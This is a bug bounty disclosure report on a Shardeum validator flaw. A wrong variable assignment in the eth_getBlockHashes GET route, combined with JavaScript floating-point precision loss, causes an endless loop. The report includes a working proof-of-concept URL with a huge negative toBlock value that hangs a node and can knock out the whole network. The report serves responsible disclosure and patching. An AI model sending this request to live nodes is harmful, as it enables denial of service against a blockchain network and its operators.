# 33745 - \[BC - Critical] A math quirk in Javascript allows anyone to tak...

## A math quirk in Javascript allows anyone to take down any validator or the full network with an HTTP GET request.

Submitted on Jul 28th 2024 at 11:09:12 UTC by @infosec\_us\_team for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33745

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardeum/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)

### Description

## Brief/Intro

In this report, we demonstrate how to abuse a Javascript quirk related to "loss of precision" when doing math with large numbers, to send an HTTP GET request that can take down a single victim node or the entire network.

## Description

### Javascript precision loss with large numbers

Understanding the existence of the quirks we will abuse is crucial to understanding at its core **why** the code is exploited, and how to correctly patch the bug.

Please, to follow along, we strongly recommend going to a Javascript Playground, or opening the browser console, and experimenting with the concepts we'll explain.

#### 1- Auto-rounding

Let's start by checking the output to the following Javascript code:

```
let a_number = Number(9999999999999999);

console.log(`a_number: ${a_number}`);

// Output: "a_number: 10000000000000000"
```

Instead of `"a_number: 9999999999999999"` as you may expect, due to how Floating-Point Arithmetic works in Javascript the number is rounded up as soon as it is assigned to a variable.

The same happens if we use `parseInt(...)` and give it as a string:

```
let a_number = parseInt("9999999999999999");

console.log(`a_number: ${a_number}`);

// Output: "a_number: 10000000000000000"
```

#### 2- Rounding down in arithmetic operations

If we add 1 to this value (*10000000000000000*), the result rounds down by 1, leaving the operation unchanged:

```
console.log(`a_number + 1 = ${a_number + 1}`);
// Output: "a_number + 1 = 10000000000000000"
```

It doesn't matter how many times we add **1 unit** to **10000000000000000**, the result is always the same:

```
console.log(`a_number + 1 = ${a_number + 1 + 1 + 1 + 1 + 1 + 1}`);
// Output: "a_number + 1 = 10000000000000000"
```

These behaviors are not a JavaScript "feature" and have been around for quite a while. Instead of trying to explain them here, we'll just leave a link to a great website dedicated exclusively to explaining how floating-point math works: <https://floating-point-gui.de/>

Now that you have an idea of what type of quirks we exploit in this report, let's dive into the Shardeum code.

### Vulnerable code

The vulnerable entry point is the HTTP **GET** route `eth_getBlockHashes`. Here's as a reference:

```
  shardus.registerExternalGet('eth_getBlockHashes', externalApiMiddleware, async (req, res) => {

    let fromBlock: any = req.query.fromBlock
    let toBlock: any = req.query.toBlock

    if (fromBlock == null) return res.json({ error: 'Missing fromBlock' })
    if (typeof fromBlock === 'string') fromBlock = parseInt(fromBlock)
    if (fromBlock < latestBlock - ShardeumFlags.maxNumberOfOldBlocks) {
      // return max 100 blocks
      fromBlock = latestBlock - ShardeumFlags.maxNumberOfOldBlocks + 1 // 1 is added for safety
    }
    if (toBlock == null) toBlock = latestBlock
    if (typeof toBlock === 'string') fromBlock = parseInt(toBlock)
    if (toBlock > latestBlock) toBlock = latestBlock

    const blockHashes = []
    for (let i = fromBlock; i <= toBlock; i++) {
      const block = readableBlocks[i]
      if (block) blockHashes.push(block.hash)
    }
    return res.json({ blockHashes, fromBlock, toBlock })
  })
```

> <https://github.com/shardeum/shardeum/blob/dev/src/index.ts#L1275C1-L1295C5>

Let's debug it step-by-step.

**Step 1-** It asks for 2 values, *fromBlock* and *toBlock*.

```
    let fromBlock: any = req.query.fromBlock
    let toBlock: any = req.query.toBlock
```

In our exploit we will visit the following URL: http\://`SERVER_IP`:`VICTIM_PORT`/eth\_getBlockHashes?fromBlock=0\&toBlock=-9999999999999999 therefore the values for `fromBlock` and `toBlock` will be `0` and `-9999999999999999`.

```
  ┌─────────────┐  
  │fromBlock = 0│  
  └──────┬──────┘  
┌────────▽────────┐
│toBlock =        │
│-9999999999999999│
└─────────────────┘
```

**Step 2-** If the type of value given in *toBlock* is a string - which it is being interpreted as one - then the value of `fromBlock` is replaced with the output of `parseInt(toBlock)`.

```
if (typeof toBlock === 'string') fromBlock = parseInt(toBlock)
```

As we saw in the section above, you may expect the output to be **-9999999999999999**, but due to how Floating-Point Arithmetic works in Javascript is **-10000000000000000**

```
  ┌─────────────┐  
  │fromBlock = 0│  
  └──────┬──────┘  
┌────────▽────────┐                     
│toBlock =        │                     
│-9999999999999999│                     
└────────┬────────┘                     
    _____▽_____     ┌──────────────────┐
   ╱           ╲    │fromBlock =       │
  ╱ If toBlock  ╲___│-10000000000000000│
  ╲ is a String ╱yes└──────────────────┘
   ╲___________╱                        
          no                            
```

**Step 3-** We start looping from an index `i` which starts with the same value as `fromBlock` (*-10000000000000000*), we add 1 unit to `i` every time the code is ran, and we do it until `i` is bigger than the value of `toBlock` (*-9999999999999999*)

```
    const blockHashes = []
    
    for (let i = fromBlock; i <= toBlock; i++) {
      const block = readableBlocks[i]
      if (block) blockHashes.push(block.hash)
    }
```

Due to how Floating-Point Arithmetic works in Javascript, adding `1 + -10000000000000000` results in `-10000000000000000`. The value does not increase.

```
  ┌─────────────┐                                    
  │fromBlock = 0│                                    
  └──────┬──────┘                                    
┌────────▽────────┐                                  
│toBlock =        │                                  
│-9999999999999999│                                  
└────────┬────────┘                                  
    _____▽_____     ┌──────────────────┐             
   ╱           ╲    │fromBlock =       │             
  ╱ If toBlock  ╲___│-10000000000000000│             
  ╲ is a String ╱yes└─────────┬────────┘             
   ╲___________╱              │                      
         │no                  │                      
         └─────┬──────────────┘                      
        ┌──────▽──────┐                              
        │i = fromBlock│                              
        └──────┬──────┘                              
          _____▽______           ┌─────────────┐     
         ╱            ╲          │run again the│     
        ╱ i =< toBlock ╲_________│loop code    │     
        ╲              ╱yes      └──────┬──────┘     
         ╲____________╱    ┌────────────▽───────────┐
               │no         │i + 1 ==                │
       ┌───────▽───────┐   │-10000000000000000 again│
       │# this point is│   └────────────┬───────────┘
       │never reached  │        ┌───────▽──────┐     
       └───────────────┘        │# forever loop│     
                                └──────────────┘     
```

As a result, the **for** loop runs forever, it never stops.

### Impact Details

* The victim can be a single node or all nodes in the blockchain - it doesn't matter if they are active or not - bricking the entire network.
* Anyone can exploit it. The attacker doesn't have to be a validator in the network.
* The victim node will run code in a loop forever, aggressively consuming computing resources.
* All other endpoints (HTTP and Gossips) of the victim node become unresponsive. Visiting or requesting any of them will timeout.
* The rest of the nodes start to timeout their requests to the victim node and report him as lost, which may lead to a slashing event for becoming unresponsive without gossiping anything to the rest of the network.
* The victim node is removed from the network.

### Proof of Concept

**Step 1-** Start the Shardeum network locally.

**Step 2-** Wait until cycle counter 15, where all nodes are active.

**Step 3-** Visit the following link: http\://`SERVER_IP`:`VICTIM_PORT`/eth\_getBlockHashes?fromBlock=0\&toBlock=-9999999999999999

> Replace `SERVER_IP` with the IP of the server and `VICTIM_PORT` with the PORT where the victim node is running.

You have now bricked the node.

* Visit the network monitor at `http://SERVER_IP:3000` and you will see a red dot over the victim node, instead of a green one.
* Some nodes will try to interact with the victim and all their messages will timeout.

Below is an example of the output from a healthy node running in port 9002, trying to interact with the victim node to compare certs:

```
[2024-07-27T23:52:09.028] [ERROR] main - Network timeout (askBinary) on binary/compare_cert: askBinary: request timed out. "key_binary/compare_cert_f94cx0831f_1722142324006_33" 
Stack trace:
Error: askBinary: request timed out. "key_binary/compare_cert_f94cx0831f_1722142324006_33"
    at onTimeout (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/network/index.ts:455:23)
    at Timeout.reqTimeoutScheduler [as _onTimeout] (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/node_modules/@shardus/net/src/index.ts:233:5)
    at listOnTimeout (node:internal/timers:571:11)
    at processTimers (node:internal/timers:512:7) node: Node ID : 689903b9dd55fb9078f9d7204a8ac3755119dfdc99f956f1ab41005616fd60ef Node Address : fbb6f5d02245453e8d53f2e56127e8bde9f56a393dd87efa630ecca845555860 externalPort : 9005 externalIP : 127.0.0.1
```

> This output is from a log file located at `./instances/shardus-instance-9002/logs/main.log` - the victim node was running at port 9005 and the healthy one trying to contact him was at port 9002.

Repeat **Step 3** as many times as desired to take down as many validators as you wish.
